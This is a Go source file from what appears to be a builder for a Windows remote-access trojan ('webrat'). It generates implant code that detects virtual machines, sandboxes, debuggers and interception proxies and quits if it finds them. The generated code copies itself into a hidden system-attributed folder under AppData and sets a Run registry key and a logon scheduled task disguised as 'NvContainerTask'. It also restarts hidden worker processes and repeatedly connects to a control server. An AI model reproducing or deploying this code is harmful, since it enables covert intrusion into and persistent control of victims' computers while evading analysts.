package buildergen

import (
	"fmt"
	"strings"
)

func templateMisc(cfg Config) string {
	delay := cfg.StartupDelaySeconds
	if delay < 0 {
		delay = 0
	}
	if delay > 10 {
		delay = 10
	}
	buildID := escapeGoString(strings.TrimSpace(cfg.BuildID))

	return strings.TrimSpace(fmt.Sprintf(`
var startupDelaySeconds = %d
var startupDelayOnce sync.Once

func applyStartupDelay() {
	startupDelayOnce.Do(func() {
		delay := startupDelaySeconds
		if delay < 0 {
			delay = 0
		}
		time.Sleep(time.Duration(delay) * time.Second)
	})
}

func getBuildLockPath() string {
	if "%s" == "" {
		return ""
	}
	dir := filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())
	return filepath.Join(dir, fmt.Sprintf("webrat_%s.lock", "%s"))
}

func ensureSingleRunPerBuild() bool {
	lockPath := getBuildLockPath()
	if lockPath == "" {
		return true
	}

	if _, err := os.Stat(lockPath); err == nil {
		return false
	}

	if err := os.MkdirAll(filepath.Dir(lockPath), 0755); err != nil {
		return false
	}

	f, err := os.OpenFile(lockPath, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}
	_ = f.Close()
	return true
}

func shouldEnforceBuildLock() bool {
	exePath, err := os.Executable()
	if err != nil {
		return true
	}

	exePathLower := strings.ToLower(filepath.Clean(exePath))

	svcDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getProgramDataEnvName()), getWindowsUpdateDirName())))
	workerDir := strings.ToLower(filepath.Clean(filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName())))

	sep := string(os.PathSeparator)
	if strings.HasPrefix(exePathLower, svcDir+sep) || strings.HasPrefix(exePathLower, workerDir+sep) {
		return false
	}
	return true
}

func loopA() {
	mutex, err := acquireMutex(getMutexName())
	if err != nil {
		return
	}
	defer windows.CloseHandle(mutex)

	_ = setupLogger()

	rand.Seed(time.Now().UnixNano())

	var chromePid int
	var updatePid int

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(chromePid) {
				chromePid = startWorker(getWorkerExeName())
			}
			if !isProcessRunning(updatePid) {
				updatePid = startWorker(getServiceExeName())
			}
		}
	}()

	for {
		connectToServer()
		time.Sleep(5 * time.Second)
	}
}

func startWorker(exeName string) int {
	cmd := exec.Command(exeName)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return 0
	}
	return cmd.Process.Pid
}

func acquireMutex(name string) (windows.Handle, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	h, err := windows.CreateMutex(nil, true, namePtr)
	if err != nil {
		if errno, ok := err.(syscall.Errno); !ok || errno != 0 {
			return 0, err
		}
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		if h != 0 {
			_ = windows.CloseHandle(h)
		}
		return 0, fmt.Errorf("already running")
	}
	return h, nil
}

func checkAntiVps() {
	if runtime.GOOS != "windows" {
		return
	}

	vmProcesses := []string{
		"VBoxService.exe",
		"VBoxTray.exe",
		"vmtoolsd.exe",
		"VMwareTray.exe",
		"VMwareUser.exe",
		"vmware.exe",
		"vmware-vmx.exe",
		"prl_tools.exe",
		"prl_cc.exe",
		"qemu-ga.exe",
		"vmsrvc.exe",
		"vboxservice.exe",
		"vboxtray.exe",
	}
	for _, p := range vmProcesses {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}

	vmFiles := []string{
		"C:\\Windows\\System32\\VBox*.dll",
		"C:\\Windows\\System32\\VBoxHook.dll",
		"C:\\Windows\\System32\\VBoxGuest.sys",
		"C:\\Windows\\System32\\VBoxMouse.sys",
		"C:\\Windows\\System32\\VBoxSF.sys",
		"C:\\Windows\\System32\\vmware-vmx.exe",
		"C:\\Windows\\System32\\vmware-vmx-stats.exe",
		"C:\\Windows\\System32\\vmware-vmx-debug.exe",
		"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
		"C:\\Program Files\\Oracle\\VirtualBox\\VBoxService.exe",
		"C:\\Program Files\\Oracle\\VirtualBox\\VBoxTray.exe",
	}
	for _, pattern := range vmFiles {
		if checkFileExists(pattern) {
			os.Exit(1)
		}
	}

	sandboxProcs := []string{
		"SandboxieRpcSs.exe",
		"SandboxieDcomLaunch.exe",
		"SbieSvc.exe",
		"procmon.exe",
		"procmon64.exe",
		"wireshark.exe",
		"fiddler.exe",
		"ollydbg.exe",
		"idaq.exe",
		"idaq64.exe",
		"x64dbg.exe",
		"x32dbg.exe",
		"windbg.exe",
	}
	for _, p := range sandboxProcs {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}

	if runtime.NumCPU() < 2 {
		os.Exit(1)
	}
}

func checkAntiMitm() {
	if runtime.GOOS != "windows" {
		return
	}

	if hasProxyConfigured() {
		os.Exit(1)
	}

	mitmProcs := []string{
		"Fiddler.exe",
		"FiddlerEverywhere.exe",
		"Charles.exe",
		"BurpSuite.exe",
		"burp.exe",
		"mitmproxy.exe",
		"Proxifier.exe",
		"HTTPDebuggerUI.exe",
		"HTTPDebuggerSvc.exe",
		"sslsplit.exe",
		"sslproxy.exe",
		"zap.exe",
		"OWASPZAP.exe",
	}
	for _, p := range mitmProcs {
		if checkProcessRunning(p) {
			os.Exit(1)
		}
	}
}

func hasProxyConfigured() bool {
	for _, key := range []string{"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"} {
		if v := strings.TrimSpace(os.Getenv(key)); v != "" {
			if _, err := url.Parse(v); err == nil {
				return true
			}
		}
	}

	cmd := exec.Command("netsh", "winhttp", "show", "proxy")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()

	if err == nil {
		text := strings.ToLower(string(out))
		if strings.Contains(text, "proxy server"); text != "" && !strings.Contains(text, "direct access") {
			return true
		}
	}

	return false
}

func checkFileExists(pattern string) bool {
	matches, err := filepath.Glob(pattern)
	return err == nil && len(matches) > 0
}

func checkProcessRunning(processName string) bool {
	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()

	if err != nil {
		return false
	}
	return strings.Contains(string(output), processName)
}

func ensureNormalInstall() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	appData := os.Getenv(getAppDataEnvName())
	if appData == "" {
		return false
	}

	targetDir := filepath.Join(appData, getMicrosoftDirName(), getWindowsDirName())
	targetExe := filepath.Join(targetDir, getServiceExeName())

	// If already running from installed location, continue normally
	if exePath == targetExe {
		return false
	}

	// Check if already installed
	if _, err := os.Stat(targetExe); err == nil {
		// Launch the installed version and exit
		cmd := exec.Command(targetExe)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Start()
		return true
	}

	// First time install: drop & hide
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return false
	}

	// Copy self
	if err := copyFile(exePath, targetExe); err != nil {
		return false
	}

	// Hide files: set hidden + system attributes
	if err := windows.SetFileAttributes(windows.StringToUTF16Ptr(targetExe), windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM); err != nil {
		// Ignore error
	}
	if err := windows.SetFileAttributes(windows.StringToUTF16Ptr(targetDir), windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM); err != nil {
		// Ignore error
	}

	// Set HKCU Run key for persistence
	regCmd := fmt.Sprintf("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"NvContainerTask\" /t REG_SZ /d \"%s\" /f", targetExe)
	cmd := cmdHidden("cmd", "/C", regCmd)
	_ = cmd.Run()

	// Create user-level scheduled task
	taskCmd := fmt.Sprintf("schtasks /create /sc onlogon /tn \"NvContainerTask\" /tr \"%s\" /ru %s /f", targetExe, os.Getenv("USERNAME"))
	cmd = cmdHidden("cmd", "/C", taskCmd)
	_ = cmd.Run()

	// Launch the installed version and exit
	cmd = exec.Command(targetExe)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Start()
	return true
}

func cmdHidden(name string, arg ...string) *exec.Cmd {
	cmd := exec.Command(name, arg...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	return destFile.Sync()
}

func setupLogger() *os.File { return nil }